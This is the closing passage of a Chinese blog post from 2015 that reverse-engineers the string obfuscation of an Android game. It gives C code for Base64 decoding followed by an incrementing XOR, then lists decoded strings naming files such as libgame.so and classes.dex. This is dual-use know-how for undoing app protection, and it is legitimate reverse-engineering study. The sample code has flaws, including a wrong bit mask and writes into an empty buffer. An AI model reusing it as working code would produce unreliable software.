class="line">//解密字符串</div><div class="line">const char Base64In[]=&quot;7cXSzdbWxsPUhsbf3w==&quot;;</div><div class="line">const  size_t  lens2  =  (sizeof(Base64In)- 1)*3/4 -2;</div><div class="line">//Base64解密后存放</div><div class="line">unsigned char XorIn[] =&quot;&quot;; </div><div class="line">//Base64解密</div><div class="line">base64_decode( Base64In, XorIn);</div><div class="line">//Xor解密后存放</div><div class="line">char Base64Outd[100] = &quot;&quot;;</div><div class="line">//Xor解密</div><div class="line">for  (size_t  i  = 0  ;  i  &lt;  lens2;  i++)  &#123; </div><div class="line"></div><div class="line">	 Base64Outd[i] = XorIn[i]  ^  (Key2+i);</div><div class="line"></div><div class="line">&#125;</div><div class="line">printf(&quot;%s\n&quot;,  Base64Outd); </div><div class="line"></div><div class="line"></div><div class="line">int  base64_decode( const char * base64, unsigned char * bindata )</div><div class="line">&#123;</div><div class="line">    int i, j;</div><div class="line">    unsigned char k;</div><div class="line">    unsigned char temp[4];</div><div class="line">    for ( i = 0, j = 0; base64[i] != &apos;\0&apos; ; i += 4 )</div><div class="line">    &#123;</div><div class="line">        memset( temp, 0xFF, sizeof(temp) );</div><div class="line">        for ( k = 0 ; k &lt; 64 ; k ++ )</div><div class="line">        &#123;</div><div class="line">            if ( base64char[k] == base64[i] )</div><div class="line">                temp[0]= k;</div><div class="line">        &#125;</div><div class="line">        for ( k = 0 ; k &lt; 64 ; k ++ )</div><div class="line">        &#123;</div><div class="line">            if ( base64char[k] == base64[i+1] )</div><div class="line">                temp[1]= k;</div><div class="line">        &#125;</div><div class="line">        for ( k = 0 ; k &lt; 64 ; k ++ )</div><div class="line">        &#123;</div><div class="line">            if ( base64char[k] == base64[i+2] )</div><div class="line">                temp[2]= k;</div><div class="line">        &#125;</div><div class="line">        for ( k = 0 ; k &lt; 64 ; k ++ )</div><div class="line">        &#123;</div><div class="line">            if ( base64char[k] == base64[i+3] )</div><div class="line">                temp[3]= k;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        bindata[j++] = ((unsigned char)(((unsigned char)(temp[0] &lt;&lt; 2))&amp;0xFC)) |</div><div class="line">                ((unsigned char)((unsigned char)(temp[1]&gt;&gt;4)&amp;0x03));</div><div class="line">        if ( base64[i+2] == &apos;=&apos; )</div><div class="line">            break;</div><div class="line"></div><div class="line">        bindata[j++] = ((unsigned char)(((unsigned char)(temp[1] &lt;&lt; 4))&amp;0xF0)) |</div><div class="line">                ((unsigned char)((unsigned char)(temp[2]&gt;&gt;2)&amp;0x0F));</div><div class="line">        if ( base64[i+3] == &apos;=&apos; )</div><div class="line">            break;</div><div class="line"></div><div class="line">        bindata[j++] = ((unsigned char)(((unsigned char)(temp[2] &lt;&lt; 6))&amp;0xF0)) |</div><div class="line">                ((unsigned char)(temp[3]&amp;0x3F));</div><div class="line">    &#125;</div><div class="line">    return j;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="0x5-测试结果"><a href="#0x5-测试结果" class="headerlink" title="0x5 测试结果"></a>0x5 测试结果</h1><p><img src="http://img.blog.csdn.net/20150727000650289" alt="这里写图片描述"><br>7cXSzdbWxsPUhsbf3w==  ——–&gt; resources.out</p>
<p>88nDjcLWyMPGysCFx8XPyc7d1JzA2w==  ——–&gt; lib/armeabi/libgame.so</p>
<p>88nDjcLWyMPGysCH3ZvMgcPZ09XS2dCYxNc=  ——–&gt; lib/armeabi-v7a/libgame.so</p>
<p>/MzA0dDB1ojDzdE=   ——–&gt; classes.dex</p>
<h1 id="0x6-总结"><a href="#0x6-总结" class="headerlink" title="0x6 总结"></a>0x6 总结</h1><p>需要十足的耐心来分析算法，很锻炼人，睡觉。</p>
<p>2015.7.26<br>By Ericky</p>

    
  </div>
  <footer class="end-sep">
    
      
      
    
    <div class="clearfix"></div>
  </footer>
</article>


  

  <nav id="pagination">
  
  
    <a href="/page/2/" class="next">下一页</a>
  
  <div class="clearfix"></div>
</nav>

</div>
  </div>
  <footer id="footer"><div class="copyright">
  
  &copy; 2017 <a href="/">Ericky1992</a>
  
</div>
<div class="theme-copyright">
  Theme by <a href="https://github.com/orderedlist" target="_blank">orderedlist</a>
   | 
  Redesign by <a href="http://heroicyang.com/" target="_blank">Heroic Yang</a>
</div>
<div class="clearfix"></div></footer>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8/jquery.min.js"></script>
<script src="/js/scale.fix.js"></script>
<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>




<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
  (function($){
    $('.fancybox').fancybox();
  })(jQuery);
</script>

</body>
</html>